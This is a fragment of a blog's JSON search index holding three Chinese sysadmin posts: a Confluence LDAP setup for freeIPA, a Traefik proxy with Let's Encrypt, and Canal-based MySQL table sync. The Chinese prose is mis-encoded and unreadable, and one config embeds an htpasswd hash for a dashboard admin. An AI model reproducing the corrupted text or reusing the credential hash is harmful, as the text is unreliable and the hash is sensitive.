class=\"o\"\u003e=\u003c/span\u003ebybon,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ecn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Additional User DN: \u003cspan class=\"nv\"\u003ecn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eusers,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eaccounts\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Additional Group DN:cn\u003cspan class=\"o\"\u003e=\u003c/span\u003egroups,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eaccounts\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLDAP Permissions:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSelect Read/Write\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAdvanced Settings: Default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eUser Schema Settings\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Object Class: inetorgperson\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Object Filter: \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eobjectclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003einetorgperson\u003cspan class=\"o\"\u003e)(\u003c/span\u003e\u003cspan class=\"nv\"\u003ememberOf\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003ecn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003econfluence-users,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003egroups,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eaccounts,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ebybon,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ecn\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Name Attribute: uid\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Name RDN Attribute: uid\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User First Name Attribute: giveName\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Last Name Attribute: sn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Display Name Attribute: displayName\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Email Attribute: mail\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Password Attribute: userPassword\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Password Encryption: SHA\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Unique ID Attribute: uid\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGroup Schema Settings\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Group Object Class: groupofnames \u003cspan class=\"c1\"\u003e# all lowercase\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Group Object Filter: \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eobjectclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003egroupofnames\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"c1\"\u003e# all lowercase\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Group Name Attribute: cn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Group Description Attribute: description\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eMembership Schema Settings\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Group Members Attribute: member \u003cspan class=\"c1\"\u003e#lowercase\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Membership Attribute:memberOf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ”¾å…¨ä¸­æ–‡çš„å›¾å¦‚ä¸‹ï¼š\u003c/p\u003e","title":"Confluenceé›†æˆè¿›freeIPAè¿›è¡Œç»Ÿä¸€è®¤è¯"},{"content":"nginxå’Œtraefikéƒ½å¯ä»¥åšingressï¼Œåœ¨å…¥å£å¤„åšè¯ä¹¦çš„å¸è½½ï¼Œå¹¶è½¬å‘tcpã€udpã€httpsã€httpæµé‡\nnginxæ˜¯æ¯”è¾ƒé€šå¸¸çš„åšæ³•ï¼Œtraefiké…ç½®æ¯”è¾ƒç®€å•ï¼Œå°¤å…¶æ˜¯é…ç½®è‡ªåŠ¨ç»­ç­¾çš„è¯ä¹¦\nwget https://github.com/traefik/traefik/releases/download/v2.4.8/traefik_v2.4.8_linux_amd64.tar.gz è§£å‹é‡Šæ”¾å‡ºæ¥traefikæ–‡ä»¶ï¼Œå»ºç«‹ç›®å½•/export/servers/traefik\nç»“æ„å¦‚ä¸‹ï¼š\ntraefik.yml\nlog:\rlevel: DEBUG\rapi:\rinsecure: false\rdashboard: true\rentryPoints:\rhttp:\raddress: \u0026#34;:80\u0026#34;\r#http:\r# redirections:\r# entryPoint:\r# to: https\r# scheme: https\rhttps:\raddress: \u0026#34;:443\u0026#34;\rcertificatesResolvers:\rletsEncrypt:\racme:\rstorage: /export/servers/traefik/acme.json\remail: zhangranrui@rendoumi.com\rtlsChallenge: {}\rhttpChallenge:\rentryPoint: http\rproviders:\rfile:\rdirectory: /export/servers/traefik/dynamic\rwatch: true ä¸Šé¢æˆ‘ä»¬å®šä¹‰äº†logçš„levelä¸ºDEBUGï¼Œå¹¶ä¸”å¼€æ”¾äº†dashboard\nå®šä¹‰äº†2ä¸ªå…¥å£ï¼Œhttpå’Œhttpsï¼Œå¯ä»¥ç›´æ¥ç”¨ä¸­é—´ä»¶å¼ºåˆ¶httpè·³è½¬https\nç„¶åå®šä¹‰äº†letsEncryptçš„è¯ä¹¦æœºæ„\næœ€åå®šä¹‰äº†åŠ¨æ€ç›‘æ§ /export/servers/traefik/dynamic ç›®å½•ï¼Œå¦‚æœä¸‹é¢æœ‰å¢åŠ æ–‡ä»¶ä¼šè‡ªåŠ¨æ›´æ–°é…ç½®ã€‚\nç„¶åå†dynamicç›®å½•ä¸‹å®šä¹‰è½¬å‘routes\næ³¨æ„å‘½åæ–‡ä»¶ï¼Œtest7æ˜¯åŸŸåï¼Œ01æ˜¯åºåˆ—å·ï¼Œæ–‡ä»¶å†…å®¹ä¸­svcçš„åºåˆ—å·æœ€å¥½è·Ÿæ–‡ä»¶åä¸€è‡´ï¼Œå¦‚æœå¤šæ–‡ä»¶é‡å¤ä¼šå¯¼è‡´é…ç½®ä¸å¯ç”¨ï¼ï¼ï¼\ntest7-01.yml\nhttp:\rrouters:\rhttps_01:\rrule: \u0026#34;Host(`test7.ddky.com`)\u0026#34;\rservice: svc_01\rtls:\rcertresolver: letsEncrypt\rhttp:\rrule: \u0026#34;Host(`test7.ddky.com`)\u0026#34;\rservice: svc_01\rentryPoints:\r- http\rservices:\rsvc_01:\rloadBalancer:\rservers:\r- url: \u0026#34;http://172.16.8.1:80\u0026#34; test8-02.yml\nhttp:\rrouters:\rhttps_02:\rrule: \u0026#34;Host(`test8.ddky.com`)\u0026#34;\rservice: svc_02\rtls:\rcertresolver: letsEncrypt\rhttp_02:\rrule: \u0026#34;Host(`test8.ddky.com`)\u0026#34;\rservice: svc_02\rentryPoints:\r- http\rservices:\rsvc_02:\rloadBalancer:\rservers:\r- url: \u0026#34;http://172.18.31.33:80\u0026#34; dashboard.yml\nhttp:\rrouters:\rapi-router:\rrule: \u0026#34;PathPrefix(`/api`) || PathPrefix(`/dashboard`)\u0026#34;\rservice: api@internal\rentryPoints:\r- http\rmiddlewares:\r- dashboard-login\rmiddlewares:\rdashboard-login:\rbasicAuth:\rusers:\r- \u0026#34;admin:$apr1$u1xEoYqW$V5O5t4rmdly58WqS4nTVq1\u0026#34; æ‰“å¼€http://192.168.85.202/dashboard/#/\nuser: admin pass: xxxxxxxx\nè¿™æ ·å°±å¯ä»¥äº†\n","permalink":"https://rendoumi.com/posts/20230131-traefik_certificate/","summary":"\u003cp\u003enginxå’Œtraefikéƒ½å¯ä»¥åšingressï¼Œåœ¨å…¥å£å¤„åšè¯ä¹¦çš„å¸è½½ï¼Œå¹¶è½¬å‘tcpã€udpã€httpsã€httpæµé‡\u003c/p\u003e\n\u003cp\u003enginxæ˜¯æ¯”è¾ƒé€šå¸¸çš„åšæ³•ï¼Œtraefiké…ç½®æ¯”è¾ƒç®€å•ï¼Œå°¤å…¶æ˜¯é…ç½®è‡ªåŠ¨ç»­ç­¾çš„è¯ä¹¦\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ewget https://github.com/traefik/traefik/releases/download/v2.4.8/traefik_v2.4.8_linux_amd64.tar.gz\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eè§£å‹é‡Šæ”¾å‡ºæ¥traefikæ–‡ä»¶ï¼Œå»ºç«‹ç›®å½•/export/servers/traefik\u003c/p\u003e\n\u003cp\u003eç»“æ„å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230131-traefik_certificate/2021-07-21_100638.png\"\u003e\u003c/p\u003e\n\u003cp\u003etraefik.yml\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003elog:\r\n  level: DEBUG\r\n\r\napi:\r\n  insecure: false\r\n  dashboard: true\r\n\r\nentryPoints:\r\n  http:\r\n    address: \u0026#34;:80\u0026#34;\r\n    #http:\r\n    #  redirections:\r\n    #    entryPoint:\r\n    #      to: https\r\n    #      scheme: https\r\n\r\n  https:\r\n    address: \u0026#34;:443\u0026#34;\r\n\r\n\r\n\r\ncertificatesResolvers:\r\n  letsEncrypt:\r\n    acme:\r\n      storage: /export/servers/traefik/acme.json\r\n      email: zhangranrui@rendoumi.com\r\n      tlsChallenge: {}\r\n      httpChallenge:\r\n        entryPoint: http\r\n\r\nproviders:\r\n  file:\r\n    directory: /export/servers/traefik/dynamic\r\n    watch: true\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¸Šé¢æˆ‘ä»¬å®šä¹‰äº†logçš„levelä¸ºDEBUGï¼Œå¹¶ä¸”å¼€æ”¾äº†dashboard\u003c/p\u003e\n\u003cp\u003eå®šä¹‰äº†2ä¸ªå…¥å£ï¼Œhttpå’Œhttpsï¼Œå¯ä»¥ç›´æ¥ç”¨ä¸­é—´ä»¶å¼ºåˆ¶httpè·³è½¬https\u003c/p\u003e\n\u003cp\u003eç„¶åå®šä¹‰äº†letsEncryptçš„è¯ä¹¦æœºæ„\u003c/p\u003e\n\u003cp\u003eæœ€åå®šä¹‰äº†åŠ¨æ€ç›‘æ§ /export/servers/traefik/dynamic ç›®å½•ï¼Œå¦‚æœä¸‹é¢æœ‰å¢åŠ æ–‡ä»¶ä¼šè‡ªåŠ¨æ›´æ–°é…ç½®ã€‚\u003c/p\u003e\n\u003cp\u003eç„¶åå†dynamicç›®å½•ä¸‹å®šä¹‰è½¬å‘routes\u003c/p\u003e\n\u003cp\u003eæ³¨æ„å‘½åæ–‡ä»¶ï¼Œtest7æ˜¯åŸŸåï¼Œ01æ˜¯åºåˆ—å·ï¼Œæ–‡ä»¶å†…å®¹ä¸­svcçš„åºåˆ—å·æœ€å¥½è·Ÿæ–‡ä»¶åä¸€è‡´ï¼Œå¦‚æœå¤šæ–‡ä»¶é‡å¤ä¼šå¯¼è‡´é…ç½®ä¸å¯ç”¨ï¼ï¼ï¼\u003c/p\u003e\n\u003cp\u003etest7-01.yml\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ehttp:\r\n  routers:\r\n    https_01:\r\n      rule: \u0026#34;Host(`test7.ddky.com`)\u0026#34;\r\n      service: svc_01\r\n      tls:\r\n        certresolver: letsEncrypt\r\n\r\n    http:\r\n      rule: \u0026#34;Host(`test7.ddky.com`)\u0026#34;\r\n      service: svc_01\r\n      entryPoints:\r\n        - http\r\n\r\n  services:\r\n    svc_01:\r\n      loadBalancer:\r\n        servers:\r\n          - url: \u0026#34;http://172.16.8.1:80\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003etest8-02.yml\u003c/p\u003e","title":"traefikè‡ªåŠ¨ç­¾å‘å¹¶ç»­è´¹è¯ä¹¦+ç«¯å£è½¬å‘"},{"content":"æ™®éçš„å¤§æ•°æ®æŠ½æ•°çš„æ–¹å¼éƒ½æ˜¯ä»æ•£è½åœ¨å„ä¸ªåœ°æ–¹çš„ MySQL æ•°æ®åº“ä¸­å¼€è´¦å·ï¼Œç„¶åæŠŠæ•°æ®åŒæ­¥è¿‡æ¥ã€‚\nè¿™ä¸ï¼Œå¤§æ•°æ®çš„åŒäº‹æå‡ºäº†ä¸€ä¸ªéœ€æ±‚ï¼Œæƒ³æŠŠæŸä¸ªåº“ä¸­çš„æŸä¸ªè¡¨çš„æ•°æ®å•ç‹¬åŒæ­¥åˆ°å¤§æ•°æ®çš„ç»Ÿä¸€åº“ä¸­çš„æŸä¸ªè¡¨ä¸­ã€‚\nç ”ç©¶äº†ä¸€ä¸ªæ˜ŸæœŸï¼Œcanal çš„é…ç½®å¯¹è¿ç»´æ¥è¯´éå¸¸çš„ä¸å‹å¥½ï¼Œé™¤éç”¨å®ƒé‚£ä¸ª admin çš„ dashboardï¼Œä½†æ˜¯è¿ç»´é€šå¸¸æ˜¯ cli ç•Œé¢ï¼Œè°æ²¡äº‹è£…ä¸ª dashboard æ¥é…ç½®å‘¢ï¼Œå¤ª low äº†ã€‚\nç”¨çš„æ˜¯ canal 1.1.5 çš„ç‰ˆæœ¬ï¼Œä¸èƒ½å‡çº§ï¼Œå‡çº§å java ä¸å¯¹äº†ã€‚è¿˜æ²¡æœ‰åˆ°ç”¨ 1.1.6 çš„æ—¶å€™ï¼\nèƒŒæ™¯ï¼š\næºæ•°æ®åº“ï¼š10.8.2.12 åº“ï¼šxxl_job è¡¨ï¼šdemotable666 ç›®çš„æ•°æ®åº“ï¼š10.8.2.17 åº“ï¼šxxl_job_bak è¡¨ï¼šdemotable666 è€Œä¸”ä¸ç”¨ä»»ä½•çš„Zookeeperã€Kafkaã€RabbitMQçš„ä¸­é—´ä»¶ï¼Œè¶Šç®€æ´è¶Šå¥½ã€‚\nä¸€ã€å®‰è£…canal wget https://github.com/alibaba/canal/releases/download/canal-1.1.5/canal.deployer-1.1.5.tar.gz wget https://github.com/alibaba/canal/releases/download/canal-1.1.5/canal.adapter-1.1.5.tar.gz #éƒ½è£…åˆ° /app ç›®å½•ä¸‹ mkdir /app mkdir /app/deploy mkdir /app/adapter cd /app/deploy tar zxvf canal.deployer-1.1.5.tar.gz cd /app/adapter tar zxvf canal.adapter-1.1.5.tar.gz äºŒã€MySQLæºå‡†å¤‡ # /etc/my.cnf åŠ å…¥ä»¥ä¸‹å‡ é¡¹å¹¶é‡å¯ [mysqld] log-bin=mysql-bin # Start log bin. binlog_format=ROW # Log format. server-id=1 # Server id,different from slave. æˆæƒbinlogåŒæ­¥ï¼š\n# åˆ›å»ºç”¨æˆ·æˆæƒ mysql\u0026gt; CREATE USER canal IDENTIFIED BY \u0026#39;canal\u0026#39;; mysql\u0026gt; GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO \u0026#39;canal\u0026#39;@\u0026#39;10.8.2.17\u0026#39; identified by \u0026#34;xxxxxx\u0026#34;; mysql\u0026gt; FLUSH PRIVILEGES; # æŸ¥çœ‹æˆæƒ mysql\u0026gt; show grants for \u0026#39;canal\u0026#39;; ä¸‰ã€é…ç½®deploy å…¶å®å…³é”®å°±æ˜¯ä¸¤ä¸ªé…ç½®\n1ã€canal.properties\nmkdir /app/deploy/conf/10.8.2.12 cp /app/deploy/conf/example/instance.properties /app/deploy/conf/10.8.2.12 vi /app/deploy/conf/canal.properties #å°±æ”¹ä¸¤ä¸ªåœ°æ–¹ canal.destinations = 10.8.2.12 canal.auto.scan = false æ³¨æ„ï¼Œä¸Šé¢ä¸€å®šè¦æŠŠ canal.auto.scan ä¿®æ”¹æˆ falseï¼Œå¦åˆ™å®ƒä¼šè‡ªåŠ¨æ‰«æ conf ç›®å½•ä¸‹çš„æ‰€æœ‰é…ç½®ï¼Œè¿™æ · example å­ç›®å½•æ— è®ºæ˜¯å¦æœ‰ç”¨åˆ°ï¼Œé…ç½®éƒ½ä¼šè¢«æ‰«è¿›å»ã€‚è¿™ä¸æ˜¯ç¥ç»ç—…ä¹ˆï¼Œå…¸å‹çš„ java ç¨‹åºçŒ¿è‡ªä»¥ä¸ºæ˜¯çš„é…ç½®ã€‚\n2ã€instance.properties çš„é…ç½®\nvi /app/deploy/conf/10.8.2.12/instance.properties # instance.properties æ˜¯æ‹·è´exampleç›®å½•ä¸­çš„ # æ”¹åŠ¨ canal.instance.master.address=10.8.2.12:3306 canal.instance.tsdb.enable=false # username/password canal.instance.dbUsername=canal canal.instance.dbPassword=xxxxxx # table regex #1. æ‰€æœ‰è¡¨ï¼š.* or .*\\\\..* #2. canal schemaä¸‹æ‰€æœ‰è¡¨ï¼š canal\\\\..* #3. canalä¸‹çš„ä»¥canalæ‰“å¤´çš„è¡¨ï¼šcanal\\\\.canal.* #4. canal schemaä¸‹çš„ä¸€å¼ è¡¨ï¼šcanal\\\\.test1 #5. å¤šä¸ªè§„åˆ™ç»„åˆä½¿ç”¨ï¼šcanal\\\\..*,mysql.test1,mysql.test2 (é€—å·åˆ†éš”) #canal.instance.filter.regex=.*\\\\..* canal.instance.filter.regex=xxl_job\\\\..* ä¸Šé¢å…¶å®å°±æ˜¯è®¾ç½®äº† canal å»ä¼ªè£…æˆä¸€ä¸ª slaveï¼Œè¯»å– binlog æ—¥å¿—ï¼Œå¹¶ä¸”è¿‡æ»¤åªè¯»å– xxl_job çš„æ—¥å¿—ã€‚\nå¯åŠ¨ deploy\ncd /app/deploy/bin ./startup.sh çœ‹çœ‹æ—¥å¿—æ— å¼‚å¸¸å³å¯ï¼š\nå››ã€å‡†å¤‡å¥½ç›®çš„æ•°æ®åº“çš„åº“è¡¨ç»“æ„ æºæ•°æ®åº“å·²ç»æœ‰ demotable666 çš„è¡¨äº†ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç›®çš„æ•°æ®åº“äº‹å…ˆå‡†å¤‡å¥½ demotable666\n# åœ¨ 10.8.2.17 çš„ xxl_job_bak åº“ä¸Šæ‰§è¡Œ mysql\u0026gt; use xxl_job_bak; mysql\u0026gt; create table demotable666( UserId int NOT NULL AUTO_INCREMENT PRIMARY KEY, UserName varchar(100), UserLoginDate date NOT NULL ); Query OK, 0 rows affected (0.04 sec) äº”ã€è®¾ç½®adapter 1ã€application.yml\né¦–å…ˆç»™ canal çš„æœºå™¨å¯¹ç›®çš„åº“èµ‹ mysql æƒ\nmysql\u0026gt; grant all privileges on xxl_job_bak.* to sync_17@\u0026#39;%\u0026#39; identified by \u0026#34;xxxxxx\u0026#34;; mysql\u0026gt; flush privileges; ç„¶åç¼–è¾‘application.yml\nvi /app/adapter/conf/application.yml #æ³¨é‡Šæ‰srcDataSourcesï¼Œmysql åŒæ­¥åˆ° mysqlçš„åœºæ™¯ä¸­å®Œå…¨ç”¨ä¸åˆ°è¿™ä¸ªï¼Œesè¦ç”¨åˆ° # srcDataSources: # defaultDS: # url: jdbc:mysql://127.0.0.1:3306/mytest?useUnicode=true # username: root # password: 121212 canalAdapters: - instance: 10.8.2.12 # canal instance Name or mq topic name groups: - groupId: g1 outerAdapters: - name: logger - name: rdb key: mysqlbak1 properties: jdbc.driverClassName: com.mysql.jdbc.Driver jdbc.url: jdbc:mysql://10.8.2.17:3306/xxl_job_bak?useUnicode=true jdbc.username: sync_17 jdbc.password: xxxxxx æ³¨æ„ä¸Šé¢é…çš„instanceï¼Œè¿™ä¸ªè·Ÿdeployé‡Œé¢çš„instanceæ²¡æœ‰åŠæ¯›é’±å…³ç³»ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†rdbé‡Œé¢çš„é…ç½®å‚è€ƒç”¨çš„ã€‚\n2ã€ç¼–è¾‘è¡¨åŒæ­¥é…ç½®æ–‡ä»¶mysqlbak1.yml\næ³¨æ„ä¸Šé¢çš„jdbc.urlæŒ‡å®šäº†åº“æ˜¯xxl_job_bakï¼Œæ‰€ä»¥ä¸‹é¢é…ç½®çš„ targetTable å°±æ˜¯å•ç‹¬ä¸€ä¸ª demotable666ï¼Œå¾ˆå¤šæ–‡ç« é‡Œå†™åº“å.è¡¨åï¼Œ xxl_job_bak.demotable666ï¼Œå…«æˆ’æ˜¯æ²¡è¿™æ ·æˆåŠŸã€‚\n#ç”¨ä¸åˆ°çš„æŒªæˆå¤‡ä»½ mv /app/adapter/conf/rdb/mytest_user.yml /app/adapter/conf/rdb/mytest_user.bak vi /app/adapter/conf/rdb/mysqlbak1.yml #dataSourceKey: mysqlbakDS1 # cannalçš„instanceæˆ–è€…MQçš„topic destination: 10.8.2.12 groupId: g1 outerAdapterKey: mysqlbak1 concurrent: true dbMapping: database: xxl_job table: demotable666 targetTable: demotable666 targetPk: UserId: UserId # mapAll: true targetColumns: UserId: UserName: UserLoginDate: # etlCondition: \u0026#34;where c_time\u0026gt;={}\u0026#34; commitBatch: 1 # æ‰¹é‡æäº¤çš„å¤§å° å¯åŠ¨ adapterï¼š\ncd /app/adapter/bin ./startup.sh è¿™æ ·å°±å¥½äº†ã€‚\nåœ¨10.8.2.12çš„æºæ•°æ®åº“ä¸Šæ’å…¥æ•°æ®ï¼š\ninsert into demotable666(UserName,UserLoginDate) values(\u0026#39;john\u0026#39;,DATE(NOW())); åœ¨ 10.8.2.17 å¯ä»¥çœ‹åˆ°æ–°æ•°æ®è‡ªåŠ¨è¿‡æ¥äº†ï¼Œè¿™æ ·å°±æå®šäº†ã€‚\nå…­ã€æ‹“å±•æ•´åº“åŒæ­¥ ä¸Šé¢æˆ‘ä»¬å®ç°äº†è¡¨åŒæ­¥ï¼Œä¸‹é¢æ‹“å±•è¯´ä¸€ä¸‹å¦‚ä½•å®ç°æ•´åº“çš„åŒæ­¥ï¼š\n1ã€è®¾ç½®application.ymlï¼Œrdbå¢åŠ ä¸€ä¸ªkey: mysqlbak2ï¼Œjdbc.url è¿æ¥ä¸²ä¸è®¾ç½®åº“å\ncanalAdapters: - instance: 10.8.2.12 # canal instance Name or mq topic name groups: - groupId: g1 outerAdapters: - name: logger - name: rdb key: mysqlbak1 properties: jdbc.driverClassName: com.mysql.jdbc.Driver jdbc.url: jdbc:mysql://10.8.2.17:3306/xxl_job_bak?useUnicode=true jdbc.username: sync_17 jdbc.password: xxxxxx - name: rdb key: mysqlbak2 properties: jdbc.driverClassName: com.mysql.jdbc.Driver jdbc.url: jdbc:mysql://10.8.2.17:3306/?useUnicode=true jdbc.username: sync_17 jdbc.password: xxxxxx 2ã€ç¼–è¾‘è¡¨åŒæ­¥é…ç½®æ–‡ä»¶mysqlbak2.yml\næ³¨æ„ï¼Œé‡Œé¢å…¶å®åªæœ‰ä¸€ä¸ªé…ç½®èµ·ä½œç”¨ databaseï¼Œè€Œä¸”ç›®çš„åº“ä¸­å¿…é¡»äº‹å…ˆå»ºç«‹å¥½xxl_jobçš„åº“è¡¨ç»“æ„ï¼Œåº“åä¹Ÿå¿…é¡»å’Œæºä¸­åº“åå®Œå…¨ä¸€è‡´ï¼Œä¸¾ä¾‹æ¥è¯´ï¼Œä» xxl_job åªèƒ½åŒæ­¥åˆ° xxl_jobï¼Œä¸èƒ½ä»xxl_jobåŒæ­¥åˆ°xxl_jobbakä¸­ã€‚\n#dataSourceKey: defaultDS # cannalçš„instanceæˆ–è€…MQçš„topic destination: 10.8.2.12 groupId: g1 outerAdapterKey: mysqlbak2 concurrent: true dbMapping: mirrorDb: true database: xxl_job ç„¶åæˆ‘ä»¬çœ‹ 10.8.2.17 ä¸Šé¢ xxl_job åº“é‡Œçš„æ•°æ®å°±ä¼šå¢é‡å¼€å§‹è·Ÿæºåº“åŒæ­¥äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20230115-canal_mysql/","summary":"\u003cp\u003eæ™®éçš„å¤§æ•°æ®æŠ½æ•°çš„æ–¹å¼éƒ½æ˜¯ä»æ•£è½åœ¨å„ä¸ªåœ°æ–¹çš„ MySQL æ•°æ®åº“ä¸­å¼€è´¦å·ï¼Œç„¶åæŠŠæ•°æ®åŒæ­¥è¿‡æ¥ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ï¼Œå¤§æ•°æ®çš„åŒäº‹æå‡ºäº†ä¸€ä¸ªéœ€æ±‚ï¼Œæƒ³æŠŠæŸä¸ªåº“ä¸­çš„æŸä¸ªè¡¨çš„æ•°æ®å•ç‹¬åŒæ­¥åˆ°å¤§æ•°æ®çš„ç»Ÿä¸€åº“ä¸­çš„æŸä¸ªè¡¨ä¸­ã€‚\u003c/p\u003e\n\u003cp\u003eç ”ç©¶äº†ä¸€ä¸ªæ˜ŸæœŸï¼Œcanal çš„é…ç½®å¯¹è¿ç»´æ¥è¯´éå¸¸çš„ä¸å‹å¥½ï¼Œé™¤éç”¨å®ƒé‚£ä¸ª admin çš„ dashboardï¼Œä½†æ˜¯è¿ç»´é€šå¸¸æ˜¯ cli ç•Œé¢ï¼Œè°æ²¡äº‹è£…ä¸ª dashboard æ¥é…ç½®å‘¢ï¼Œå¤ª low äº†ã€‚\u003c/p\u003e\n\u003cp\u003eç”¨çš„æ˜¯ canal 1.1.5 çš„ç‰ˆæœ¬ï¼Œä¸èƒ½å‡çº§ï¼Œå‡çº§å java ä¸å¯¹äº†ã€‚è¿˜æ²¡æœ‰åˆ°ç”¨ 1.1.6 çš„æ—¶å€™ï¼\u003c/p\u003e\n\u003cp\u003eèƒŒæ™¯ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eæºæ•°æ®åº“ï¼š10.8.2.12 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eåº“ï¼šxxl_job\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eè¡¨ï¼šdemotable666\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eç›®çš„æ•°æ®åº“ï¼š10.8.2.17\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 